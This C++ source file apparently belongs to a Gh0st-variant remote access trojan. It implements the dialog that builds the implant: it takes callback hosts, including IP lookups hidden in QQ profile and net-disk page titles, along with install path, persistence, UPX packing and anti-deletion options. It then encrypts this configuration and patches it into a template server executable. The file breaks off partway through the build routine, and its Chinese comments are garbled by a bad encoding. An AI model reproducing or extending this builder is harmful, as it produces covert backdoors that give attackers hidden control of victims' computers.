// BuildServer1.cpp : implementation file
//

#include "stdafx.h"
#include "DHL_yk.h"
#include "BuildServer1.h"
#include <shlwapi.h>
#include "gh0stView.h"
#include "MyToolsKit.h"
#include "UPDATEIP.h"

#include "wininet.h"
		
//#import "msxml.dll"
//#import "msxml2.dll"
#import "msxml3.dll"


#pragma comment(lib, "Wininet.lib")


#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

char patht[MAX_PATH];
/////////////////////////////////////////////////////////////////////////////
// BuildServer dialog
extern CGh0stView* g_pTabView ;

BuildServer::BuildServer(CWnd* pParent /*=NULL*/)
	: CDialog(BuildServer::IDD, pParent)
{

//	m_url = _T("");
	m_ServiceName	= ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("��������","ServiceName","Protection program");  //��������
	m_remote_host1	= ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("��������", "Host1", "127.0.0.1");  //��������
	m_remote_host2	= ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("��������", "Host2", "123456789");  //QQ����
	m_remote_host3	= ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("��������", "Host3", "http://xxx.ys168.com");  //��������
	m_remote_port1	= ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("��������", "Port1", 2012);              //���߶˿� 1
	m_remote_port2	= ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("��������", "Port2", 2012);              //���߶˿� 2
	m_remote_port3	= ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("��������", "Port3", 2012);              //���߶˿� 3
	m_remote_path	= ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("��������", "InstallPath", "%SystemRoot%");  //��װĿ¼
	m_dllname		= ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("��������", "DllName", "Terms.EXE");   //��װ����
	m_exemeux		= ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("��������", "Eexmeux", "Cao360");      //���л���
	m_strVersion	= ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("��������", "Version", "S_120305");   //����汾
	m_remote_name	= ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("��������", "Remote", "Ĭ�Ϸ���");   //���߷���
	m_delrtd		= ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("��������","delrtd",0);   //��ɾ��
	m_zraz			= ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("��������","Zraz",1);       //д��ע���װ
	m_upx			= ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("��������","upx",0);         //upxѹ��
	m_azzd			= ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("��������","Azzd",0);   //��װ����
	m_zkfsms		= ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("��������","Zkfsms",0);   //ռ�ӷ�ɾ��ģʽ
	m_zkfkzj		= ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("��������","Kzjizms",0);   //K�ս���ģʽ
	m_gdtj			= ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("��������","Gdtj",0);         //���;���̶�
	m_meux			= ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("��������","Meux",0);         //�������
	


	GetModuleFileName(NULL, patht,MAX_PATH);   //��ȡ������������·������,��Gh0st.exe��·��
	PathRemoveFileSpec(patht);//ȥ���ļ����е�gh0st
//	Onzraz();
}


void BuildServer::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CBuildServer)
//	DDX_Control(pDX, IDC_TEST_MASTER, m_testBtn);
	DDX_Control(pDX, IDC_TEST_MASTER1, m_testBtn1);
	DDX_Control(pDX, IDC_TEST_MASTER2, m_testBtn2);
	DDX_Control(pDX, IDC_TEST_MASTER3, m_testBtn3);
	DDX_Control(pDX, IDC_REMOTE_HOST, m_control_host);
	DDX_Control(pDX, IDC_COMBO_GROUP, m_group_name);
	DDX_Text(pDX, IDC_SERVICE_NAME, m_ServiceName);
	DDX_Text(pDX, IDC_VERSION, m_strVersion);
	DDX_Control(pDX, IDC_COMBO_RELEASEPATH, m_releasepath);
	DDX_Text(pDX, IDC_COMBO_RELEASEPATH, m_remote_path);
//	DDX_Text(pDX, IDC_URL, m_url);
	DDX_Text(pDX, IDC_DLL_NAME, m_dllname);
	DDX_Text(pDX, IDC_EXE_MEUX, m_exemeux);
	DDX_Text(pDX, IDC_REMOTE_HOST1, m_remote_host1);  
	DDX_Text(pDX, IDC_REMOTE_HOST2,m_remote_host2);  
	DDX_Text(pDX, IDC_REMOTE_HOST3,m_remote_host3);  
	DDX_Text(pDX, IDC_REMOTE_PORT1, m_remote_port1);
	DDX_Text(pDX, IDC_REMOTE_PORT2, m_remote_port2);
	DDX_Text(pDX, IDC_REMOTE_PORT3, m_remote_port3);
	DDX_Text(pDX, IDC_COMBO_GROUP, m_remote_name);  
	DDX_Check(pDX, IDC_DELRTD, m_delrtd);   //��ɾ��  
	DDX_Check(pDX, IDC_ZRAZ, m_zraz);   //д��ע���װ
	DDX_Check(pDX, IDC_UPX, m_upx);
	DDX_Check(pDX, IDC_AZZD, m_azzd);
	DDX_Check(pDX, IDC_ZKFSMS, m_zkfsms);
	DDX_Check(pDX, IDC_ZKFKZJ, m_zkfkzj);
	DDX_Control(pDX, IDC_STATIC_ICON, m_Ico);
	DDX_Check(pDX, IDC_GDTJ, m_gdtj);
	DDX_Check(pDX, IDC_MEUX,m_meux);
	
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(BuildServer, CDialog)
	//{{AFX_MSG_MAP(CBuildServer)
	ON_BN_CLICKED(IDC_TEST_MASTER1, OnTestMaster1)
	ON_BN_CLICKED(IDC_TEST_MASTER2, OnTestMaster2)
	ON_BN_CLICKED(IDC_TEST_MASTER3, OnTestMaster3)
//	ON_BN_CLICKED(IDC_ENABLE_HTTP, OnEnableHttp)
	ON_EN_CHANGE(IDC_REMOTE_PORT, OnChangeRemotePort)
	ON_BN_CLICKED(IDC_BUILD, OnBuild)
	ON_BN_CLICKED(IDC_EXIT, OnExit)
	ON_BN_CLICKED(IDC_ZRAZ, Onzraz)  //���װ
	ON_BN_CLICKED(IDC_GDTJ, Ongdtj)  //����̶�;��
	ON_BN_CLICKED(IDC_MEUX, Onmeux)  //���⻥��ֵ
	ON_WM_LBUTTONDOWN()
	ON_CBN_SELCHANGE(IDC_REMOTE_HOST, OnSelchangeRemoteHost)
	ON_CBN_EDITCHANGE(IDC_REMOTE_HOST, OnEditchangeRemoteHost)
	ON_WM_LBUTTONDBLCLK()
	ON_WM_SETCURSOR()
	ON_BN_CLICKED(IDC_RANDOM, OnRandom)
	ON_BN_CLICKED(IDC_STATIC_ICON, OnSelectIco)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CBuildServer message handlers
/*
CHAR BuildServer::GetRandChar(BOOL  Capital,int i)
{
	DWORD iCount=GetTickCount()+i;

	iCount=(iCount+((CGh0stApp *)AfxGetApp())->GetRand())%25;
	
	CHAR Result=0;
	
	if(Capital)
		return	Result=65+iCount;
	else
		return  Result=97+iCount;
}
*/
/*
int BuildServer::memfind(const char *mem, const char *str, int sizem, int sizes)  
{   
	int   da,i,j;   
	if (sizes == 0) da = strlen(str);   
	else da = sizes;   
	for (i = 0; i < sizem; i++)   
	{   
		for (j = 0; j < da; j ++)   
			if (mem[i+j] != str[j])	break;   
			if (j == da) return i;   
	}   
	return -1;   
}
*/
VOID BuildServer::MyEncryptFunctionForServer(LPSTR szData,WORD Size)
{
	//�������������
	WORD AddTable[]={
		    3,2,5,8,5,1,2,3,2,5,3,4,1,2,
			4,3,5,8,2,4,5,8,1,2,4,3,1,1,
			8,1,2,4,3,1,1,5,2,2,1,2,1,3,
			5,2,2,1,2,1,3,3,1,2,3,5,2,6,
			2,4,1,3,2,1,2,6,2,3,3,2,1,1,
			3,6,2,1,2,4,4,3,1,2,3,5,2,6,
			3,1,2,3,5,2,6,5,2,2,1,2,1,2,
			6,2,3,3,2,1,1,5,2,2,1,2,1,2,
			3,2,5,3,4,1,2,2,3,1,2,3,5,2
	};
	
	WORD TableSize = sizeof(AddTable)/sizeof(WORD);
	WORD iCount=0;
	for (WORD i=0;i<Size;i++)
	{
		if(iCount == TableSize) 
			iCount = 0;
		
		szData[i] = ~((szData[i]^AddTable[iCount])^i);
		
		//BUG  ����iCount++ ��������������� 3..
		iCount++;
	}
}

void BuildServer::OnTestMaster1() 
{
	// TODO: Add your control notification handler code here
	UpdateData();

	if (!m_remote_host1.GetLength() || !m_remote_port1)
	{
		MessageBox("��������д����������Ϣ...","��ʾ...", MB_ICONINFORMATION);
		return;
	}
	HANDLE	hThread;
    m_testBtn1.EnableWindow(FALSE);

	hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)TestMaster1, this, 0, NULL);

	CloseHandle(hThread);

}
void BuildServer::OnTestMaster2() 
{
	// TODO: Add your control notification handler code here
	UpdateData();

	if (!m_remote_host2.GetLength() || !m_remote_port2)
	{
		MessageBox("��������дQQ������Ϣ...","��ʾ...", MB_ICONINFORMATION);
		return;
	}
	HANDLE	hThread;
	m_testBtn2.EnableWindow(FALSE);

	hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)TestMaster2, this, 0, NULL);

	CloseHandle(hThread);

}
void BuildServer::OnTestMaster3() 
{
	// TODO: Add your control notification handler code here
	UpdateData();

	if (!m_remote_host3.GetLength() || !m_remote_port3)
	{
		MessageBox("��������д����������Ϣ...","��ʾ..", MB_ICONINFORMATION);
		return;
	}
	HANDLE	hThread;
	m_testBtn3.EnableWindow(FALSE);

	hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)TestMaster3, this, 0, NULL);

	CloseHandle(hThread);

}

BOOL BuildServer::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here
	WSADATA wsaDataqq;
	WSAStartup(MAKEWORD(1,1),&wsaDataqq);//�������ip�Ͳ����ظ��������˲��Բ�������
	PHOSTENT hostinfo;
	char name[512] = {0};
	if(gethostname (name,sizeof(name)) != 0 ||
		(hostinfo = gethostbyname(name)) == NULL)
		return false;

	struct sockaddr_in dest;
	for(int a=0; hostinfo->h_addr_list[a] != NULL ;a++)
	{
		memcpy(&(dest.sin_addr), 
			hostinfo->h_addr_list[a],
			hostinfo->h_length);
		m_control_host.AddString(inet_ntoa(dest.sin_addr));

	}
	m_control_host.SetCurSel(0);
    WSACleanup();
	if (m_remote_host1.GetLength() == 0)
	{
		char hostname[256]; 
		gethostname(hostname, sizeof(hostname));
		HOSTENT *host = gethostbyname(hostname);
		if (host != NULL)
			m_remote_host1 = inet_ntoa(*(IN_ADDR*)host->h_addr_list[0]);
		else
			m_remote_host1 = _T("127.0.0.1");	
		}
	CString strGroupName, strTemp;
	int nTabs = g_pTabView->m_wndTabControl.GetItemCount();
	int i=0;
	for ( i = 0; i < nTabs; i++ )
	{
		strTemp = g_pTabView->TCItem_GetText(i);
		int n = strTemp.ReverseFind('(');
		if ( n > 0 )
		{
			strGroupName = strTemp.Left(n);
		}
		else
		{
			strGroupName = strTemp;
		}
		m_group_name.AddString(strGroupName);
	}
	m_group_name.SetCurSel(0);

	UpdateData(false);

	Onzraz();
//	OnEnableHttp();
 
	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}

void BuildServer::OnChangeRemotePort() 
{
//	OnChangeConfig();
}

DWORD WINAPI BuildServer::TestMaster1( LPVOID lparam ) 
{
	// TODO: Add your control notification handler code here
	BuildServer	*pThis = (BuildServer *)lparam;
	CString	strResult;
	bool	bRet = true;
	WSADATA	wsaData0;
	WSAStartup(0x0201, &wsaData0);
	
	SOCKET	sRemote = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sRemote == SOCKET_ERROR)
	{ 
		pThis->MessageBox("��������-��ʼ��ʧ��","��ʾ", MB_ICONINFORMATION);
		return false;
	}
	// ����socketΪ������
	u_long argp	= 1;
	ioctlsocket(sRemote, FIONBIO, &argp);
	
	struct timeval tvSelect_Time_Out;
	tvSelect_Time_Out.tv_sec = 3;
	tvSelect_Time_Out.tv_usec = 0;
	
	hostent* pHostent = NULL;
	pHostent = gethostbyname(pThis->m_remote_host1);
	if (pHostent == NULL)
	{
		bRet = false;
		goto fail;
	}
	
	// ����sockaddr_in�ṹ
	sockaddr_in	ClientAddr;
	memset(&ClientAddr,0,sizeof(ClientAddr)); 
	ClientAddr.sin_family	= AF_INET;
	ClientAddr.sin_port	= htons(pThis->m_remote_port1);
	
	ClientAddr.sin_addr = *((struct in_addr *)pHostent->h_addr);
	
	connect(sRemote, (SOCKADDR *)&ClientAddr, sizeof(ClientAddr));
	
	fd_set	fdWrite;
	FD_ZERO(&fdWrite);
	FD_SET(sRemote, &fdWrite);
	
	if (select(0, 0, &fdWrite, NULL, &tvSelect_Time_Out) <= 0)
	{	
		bRet = false;
		goto fail;
	}
    fail:
	closesocket(sRemote);
	WSACleanup();
	
	if (bRet)
		strResult.Format("��������-���ӳɹ�!...");
	else
		strResult.Format("��������-����ʧ��!...");

	pThis->MessageBox(strResult,"������ʾ...",MB_ICONINFORMATION);
	pThis->m_testBtn1.EnableWindow(true);//�ȴ�������ɵ�ʱ��ż��ť�������ε������������
	return -1;
}

/////////////////////////////////////////////////////////////////////////////////////

int memfind(const char *mem, const char *str, int sizem, int sizes)   
{   
	int   da,i,j;   
	if (sizes == 0) da = strlen(str);   
	else da = sizes;   
	for (i = 0; i < sizem; i++)   
	{   
		for (j = 0; j < da; j ++)   
			if (mem[i+j] != str[j])	break;   
			if (j == da) return i;   
	}   
	return -1;   
}

char   *substr(char   *str,int   istar,int   iend) 
{ 
	char   *p; 
	char   p1[100]={0}; 
	int   ip=0; 

    p=str; 
    ip=strlen(p); 
    if(istar> ip) 
		return   NULL; 
    else 
    { 
		p+=istar-1; 
    } 
    int   ipp=strlen(p); 
    if(ipp <iend) 
		strcpy(p1,p); 
    else 
    { 
        //p1+=iend; 
		memcpy(p1,p,iend); 
    }
	strcpy(str,p1);
    return   str; 
	
} 
/*
int ReplaceStr(char* sSrc, char* sMatchStr, char* sReplaceStr)
{
	int StringLen;
	char caNewString[64];
	char* FindPos;
	FindPos =(char *)strstr(sSrc, sMatchStr);
	if( (!FindPos) || (!sMatchStr) )
		return -1;
	
	while( FindPos )
	{
		memset(caNewString, 0, sizeof(caNewString));
		StringLen = FindPos - sSrc;
		strncpy(caNewString, sSrc, StringLen);
		strcat(caNewString, sReplaceStr);
		strcat(caNewString, FindPos + strlen(sMatchStr));
		strcpy(sSrc, caNewString);
		
		FindPos =(char *)strstr(sSrc, sMatchStr);
	}
	free(FindPos);
	return 0;
}
*/
char	*lpszQQ = NULL;
BOOL qqonline(CString str)
{
	///////////////////////////////����ip�Ļ�ȡ//////////////////////////////////////

		using namespace MSXML2;//ʹ��msxml2�����ռ�
		
		CoInitialize(NULL);//��ʼ��com�齨
		
		
		try
			
		{
			
			IXMLHTTPRequestPtr xmlrequest;// ����һ��IXMLHTTPRequestPtr����ָ��
			
			
			xmlrequest.CreateInstance("Msxml2.XMLHTTP");//���齨�еõ�����Ľ��,�齨Ҳ���൱��һ������,�����ṩ�˺ܶ�����,����ֻҪ������Ҫ�Ľӿ������ܻ���ĸ�����
			
			
			_variant_t varp(false);
			
			char abc[50]="http://user.qzone.qq.com/";
			strcat(abc,str);
			xmlrequest->open(_bstr_t("GET"),_bstr_t(abc),varp);// ��ʼ���������͵�ͷ����Ϣ
			
			
			xmlrequest->send(); // ���͵�������
			
			
			BSTR bstrbody;
			
			xmlrequest->get_responseText(&bstrbody);// ��÷������ķ�����Ϣ
			
			
			_bstr_t bstrtbody(bstrbody);// ��bstrbodyǿ��ת����_bstr_t���͵�����
			
			char	chBuff1[300*1024];    //��ȡ��������  
			strcpy(chBuff1,(LPCTSTR)bstrtbody);
			
			DWORD SizePoint;
			SizePoint = memfind(chBuff1,"<title>",sizeof(chBuff1),0);
			substr(chBuff1,SizePoint+8,15);
			
			CUPDATEIP dlg;
			dlg.ReplaceStr(chBuff1," ","");
			dlg.ReplaceStr(chBuff1,"[","");
			dlg.ReplaceStr(chBuff1,"h","");
			dlg.ReplaceStr(chBuff1,"t","");
			dlg.ReplaceStr(chBuff1,"p","");
			
			lpszQQ=chBuff1;

		}
		catch(...)
		{
			
		}
		CoUninitialize();//����ʼ��com�齨��
		
		
		return true;
}

DWORD WINAPI BuildServer::TestMaster2( LPVOID lparam ) 
{
	// TODO: Add your control notification handler code here
	BuildServer	*pThis = (BuildServer *)lparam;
	CString	strResult;
	bool	bRet = true;
	WSADATA	wsaData0;
	WSAStartup(0x0201, &wsaData0);
	
	SOCKET	sRemote = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sRemote == SOCKET_ERROR)
	{ 
		pThis->MessageBox("QQ����-��ʼ��ʧ��","��ʾ", MB_ICONINFORMATION);
		return false;
	}
	// ����socketΪ������
	u_long argp	= 1;
	ioctlsocket(sRemote, FIONBIO, &argp);
	
	struct timeval tvSelect_Time_Out;
	tvSelect_Time_Out.tv_sec = 3;
	tvSelect_Time_Out.tv_usec = 0;
	
	hostent* pHostent = NULL;
	qqonline(pThis->m_remote_host2);   //QQ����IP��ȡ
	pHostent = gethostbyname(lpszQQ);
	if (pHostent == NULL)
	{
		bRet = false;
		goto fail;
	}
	
	// ����sockaddr_in�ṹ
	sockaddr_in	ClientAddr;
	memset(&ClientAddr,0,sizeof(ClientAddr)); 
	ClientAddr.sin_family	= AF_INET;
	ClientAddr.sin_port	= htons(pThis->m_remote_port2);
	
	ClientAddr.sin_addr = *((struct in_addr *)pHostent->h_addr);
	
	connect(sRemote, (SOCKADDR *)&ClientAddr, sizeof(ClientAddr));
	
	fd_set	fdWrite;
	FD_ZERO(&fdWrite);
	FD_SET(sRemote, &fdWrite);
	
	if (select(0, 0, &fdWrite, NULL, &tvSelect_Time_Out) <= 0)
	{	
		bRet = false;
		goto fail;
	}
    fail:
	closesocket(sRemote);
	WSACleanup();
	
	if (bRet)
		strResult.Format("QQ����-���ӳɹ�!... \nIP��ַ��(%s)", lpszQQ);
	else
		strResult.Format("QQ����-����ʧ��!... \nIP��ַ��(%s)", lpszQQ);

	pThis->MessageBox(strResult,"������ʾ...",MB_ICONINFORMATION);
	pThis->m_testBtn2.EnableWindow(true);//�ȴ�������ɵ�ʱ��ż��ť�������ε������������
	return -1;
}

char	*lpszWP = NULL;
char	strKillEvent[50]={NULL};

/////////////////////////////////////////////////////////

BOOL wangpang(CString str)
{
	///////////////////////////////����ip�Ļ�ȡ//////////////////////////////////////
	
		//	 char	lpurl[256]="http://fuck360safe.ys168.com";
		char lpurl[256];
		strcpy(lpurl,str);
		//	 CString strURL;
		// CString strID,strPwd,strPath;
		char	chBuff[300*1024];    //��ȡ��������  
		
		DWORD	dwBytesRead=5000;
		HINTERNET	hNet;
		HINTERNET	hFile;
		hNet = InternetOpen("Internet Explorer 7.0", 
			
			PRE_CONFIG_INTERNET_ACCESS, NULL, INTERNET_INVALID_PORT_NUMBER, 0);  //��ȡ��ǰ�������Ӿ��
		if (hNet == NULL)   //��ʼ��ʧ��
		{
			return 0;
		}
		hFile = InternetOpenUrl(hNet, lpurl, NULL, 0, 
			
			INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_RELOAD, 0);  //��ȡURL���
		if (hFile == NULL)  //û��ȡ��URL���
		{
			
			return 0;
		}
		
		memset(chBuff, 0, sizeof(chBuff));	//memset�ڴ��ʼ��
		InternetReadFile(hFile, chBuff, sizeof(chBuff), &dwBytesRead);
		DWORD SizePoint;
		SizePoint = memfind(chBuff,"<title>",sizeof(chBuff),0);
		
		substr(chBuff,SizePoint+8,15);//111.111.111.111

		CUPDATEIP dlg;
		dlg.ReplaceStr(chBuff,"<","");
		dlg.ReplaceStr(chBuff,"/","");
		dlg.ReplaceStr(chBuff,"t","");
		dlg.ReplaceStr(chBuff,"i","");
		dlg.ReplaceStr(chBuff,"l","");

		///////////////////////////////////////////////////////////////////////////////////
		lpszWP=chBuff;
		return true;

}

DWORD WINAPI BuildServer::TestMaster3( LPVOID lparam ) 
{
	// TODO: Add your control notification handler code here
	BuildServer	*pThis = (BuildServer *)lparam;
	CString	strResult;
	bool	bRet = true;
	WSADATA	wsaData0;
	WSAStartup(0x0201, &wsaData0);
	
	SOCKET	sRemote = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sRemote == SOCKET_ERROR)
	{ 
		pThis->MessageBox("��������-��ʼ��ʧ��","��ʾ", MB_ICONINFORMATION);
		return false;
	}
	// ����socketΪ������
	u_long argp	= 1;
	ioctlsocket(sRemote, FIONBIO, &argp);
	
	struct timeval tvSelect_Time_Out;
	tvSelect_Time_Out.tv_sec = 3;
	tvSelect_Time_Out.tv_usec = 0;
	
	hostent* pHostent = NULL;
	wangpang(pThis->m_remote_host3);
	pHostent = gethostbyname(lpszWP);
	if((pHostent == NULL)||(lpszWP == NULL))
	{
		bRet = false;
		goto fail;
	}
	
	// ����sockaddr_in�ṹ
	sockaddr_in	ClientAddr;
	memset(&ClientAddr,0,sizeof(ClientAddr)); 
	ClientAddr.sin_family	= AF_INET;

	ClientAddr.sin_port	= htons(pThis->m_remote_port3);
	
	ClientAddr.sin_addr = *((struct in_addr *)pHostent->h_addr);
	
	connect(sRemote, (SOCKADDR *)&ClientAddr, sizeof(ClientAddr));
	
	fd_set	fdWrite;
	FD_ZERO(&fdWrite);
	FD_SET(sRemote, &fdWrite);
	
	if (select(0, 0, &fdWrite, NULL, &tvSelect_Time_Out) <= 0)
	{	
		bRet = false;
		goto fail;
	}
    fail:
	closesocket(sRemote);
	WSACleanup();
	
	if (bRet)
		strResult.Format("��������-���ӳɹ�!... \nIP��ַ��(%s)", lpszWP);
	else
		strResult.Format("��������-����ʧ��!... \nIP��ַ��(%s)", lpszWP);

	pThis->MessageBox(strResult,"������ʾ...",MB_ICONINFORMATION);
	pThis->m_testBtn3.EnableWindow(true);//�ȴ�������ɵ�ʱ��ż��ť�������ε������������
	return -1;
}

BOOL BuildServer::CreateServer(SERVERINFO *lpData,ONLINEINFO *lpOnline,LPSTR szPath)
{
	
	CopyFile(CGh0stApp::szCurPath,szPath,FALSE);
	
	HANDLE m_Handle =CreateFile(szPath,GENERIC_WRITE|GENERIC_READ,FILE_SHARE_WRITE|FILE_SHARE_READ,NULL,
		OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);

	if(m_Handle!=INVALID_HANDLE_VALUE)
	{
		DWORD Size = GetFileSize(m_Handle,NULL);
		char * Buffer = new char[Size];
		if(Buffer == NULL)
		{
			CloseHandle(m_Handle);
			return FALSE;
		}
		DWORD YtesRead=0;
		DWORD iCount=0;
		do
		{
			ReadFile(m_Handle,&Buffer[iCount],Size-iCount,&YtesRead,NULL);
			iCount+=YtesRead;
		}while(iCount<Size);
		
		DWORD SizePoint = memfind(Buffer,"YYYYYYYYYYYY",Size,0);//
		                                  
		if(SizePoint != 0)
		{
			SetFilePointer(m_Handle,SizePoint,0,FILE_BEGIN);
			DWORD Written=0;
			MyEncryptFunctionForServer((LPSTR)lpData,sizeof(SERVERINFO));
			WriteFile(m_Handle,lpData,sizeof(SERVERINFO),&Written,NULL);
		}
		SizePoint = memfind(Buffer,"127.0.0.1",Size,0);
		if(SizePoint != 0)
		{
			SetFilePointer(m_Handle,SizePoint,0,FILE_BEGIN);
			DWORD Written=0;
//			CheckOnlienInfo(lpOnline);
			MyEncryptFunctionForServer((LPSTR)lpOnline,sizeof(ONLINEINFO));
			WriteFile(m_Handle,lpOnline,sizeof(ONLINEINFO),&Written,NULL);
		}
		CloseHandle(m_Handle);
	}
	return TRUE;
}
/*
bool ChangeExeIcon(LPCSTR IconFile, LPCSTR ExeFile)
{
	ICONDIR1 stID;
	ICONDIRENTRY1 stIDE;
	GRPICONDIR1 stGID;
	HANDLE hFile;
	DWORD nSize, nGSize, dwReserved;
	HANDLE hUpdate;
	PBYTE pIcon, pGrpIcon;
	BOOL ret;
	
	hFile = CreateFile(IconFile, GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return false;
	}
	
	ZeroMemory(&stID, sizeof(ICONDIR1));
	ret = ReadFile(hFile, &stID, sizeof(ICONDIR1), &dwReserved, NULL);
	
	ZeroMemory(&stIDE, sizeof(ICONDIRENTRY1));
	ret = ReadFile(hFile, &stIDE, sizeof(ICONDIRENTRY1), &dwReserved, NULL);
	
	nSize = stIDE.dwBytesInRes;
	pIcon = (PBYTE)malloc(nSize);
	SetFilePointer(hFile, stIDE.dwImageOffset, NULL, FILE_BEGIN);
	ret = ReadFile(hFile, (LPVOID)pIcon, nSize, &dwReserved, NULL);
	if (!ret)
	{
		CloseHandle(hFile);
		return false;
	}
	
	ZeroMemory(&stGID, sizeof(GRPICONDIR1));
	stGID.idCount = stID.idCount;
	stGID.idReserved = 0;
	stGID.idType = 1;
	CopyMemory(&stGID.idEntries, &stIDE, 12);
	stGID.idEntries.nID = 0;
	
	nGSize = sizeof(GRPICONDIR1);
	pGrpIcon = (PBYTE)malloc(nGSize);
	CopyMemory(pGrpIcon, &stGID, nGSize);
	
	
	hUpdate = BeginUpdateResource(ExeFile, false);
	ret = UpdateResource(hUpdate, RT_GROUP_ICON, MAKEINTRESOURCE(1), 0, (LPVOID)pGrpIcon, nGSize);
	ret = UpdateResource(hUpdate, RT_ICON, MAKEINTRESOURCE(1), 0, (LPVOID)pIcon, nSize);
	EndUpdateResource(hUpdate, false);
	if (!ret)
	{
		CloseHandle(hFile);
		return false;
	}
	
	CloseHandle(hFile);
	return true;
} 
*/

static CString SavePath;
void BuildServer::OnBuild()   //void CBuildServer::OnBuild()   CBuildDialog::OnBuild() 
{
	// TODO: Add your control notification handler code here

	//�ϸ�������ݵ�׼ȷ��
	UpdateData(TRUE);
	if(m_ServiceName.IsEmpty())
	{
		MessageBox("�����������!");
		return;
	}
   if(m_remote_host1.IsEmpty())
	{
		MessageBox("����������������Ϣ...");
		return;
	}
   if(m_remote_host2.IsEmpty())
	{
		MessageBox("������QQ������Ϣ...");
		return;
	}
   if(m_remote_host3.IsEmpty())
	{
		MessageBox("����������������Ϣ...");
		return;
	}

	if(m_remote_name.IsEmpty())
	{
		MessageBox("���������߷���!");
		return;
	}
	if(m_remote_path.IsEmpty())
	{
		MessageBox("�����밲װ;��!");
		return;
	}

	ZeroMemory(&m_ServiceInfo,sizeof(SERVERINFO));
	ZeroMemory(&m_OnlineInfo,sizeof(ONLINEINFO));

	strcpy(m_OnlineInfo.DNS1,m_remote_host1.GetBuffer(0)); 
	strcpy(m_OnlineInfo.DNS2,m_remote_host2.GetBuffer(0)); 
	strcpy(m_OnlineInfo.DNS3,m_remote_host3.GetBuffer(0)); 
	m_OnlineInfo.Port1 =(WORD)m_remote_port1;
	m_OnlineInfo.Port2 =(WORD)m_remote_port2;
	m_OnlineInfo.Port3 =(WORD)m_remote_port3;
	strcpy(m_OnlineInfo.szMark,m_strVersion.GetBuffer(0));   //д�����汾


	//���dat�ļ��Ƿ����
	char path[MAX_PATH];
	sprintf(path,"%s\\Update\\U0_Server.dat",patht);
	if (IsFileExist(path)==FALSE)
	{
		strcat(path,"�ļ�������,�����ļ����ڽ�������");
		MessageBox(path);
		return;
	}

	// ��������
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("��������", "ServiceName", m_ServiceName);
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("��������", "Host1", m_remote_host1);
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("��������", "Host2", m_remote_host2);
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("��������", "Host3", m_remote_host3);
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("��������", "Port1", m_remote_port1);   //���߶˿� 1
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("��������", "Port2", m_remote_port2);   //���߶˿� 2
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("��������", "Port3", m_remote_port3);   //���߶˿� 3
    ((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("��������", "Version", m_strVersion);
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("��������", "DllName", m_dllname);  //��װ����
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("��������", "Eexmeux", m_exemeux);  //���л���
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("��������", "Remote", m_remote_name);  //���߷���
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("��������","delrtd",m_delrtd);  //��װ��ɾ��
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("��������","Zraz",m_zraz);  //ע���װ
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("��������","upx",m_upx);    //upxѹ��
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("��������","Azzd",m_azzd);    //��װ����
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("��������","Zkfsms",m_zkfsms);    //ռ�ӷ�ɾ��ģʽ
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("��������","Kzjizms",m_zkfkzj);    //K�ս���ģʽ
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("��������","Gdtj",m_gdtj);        //���;���̶�
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("��������","Meux",m_meux);        //�������

	strcpy(m_ServiceInfo.ReleacsName,m_ServiceName.GetBuffer(0));   //��������
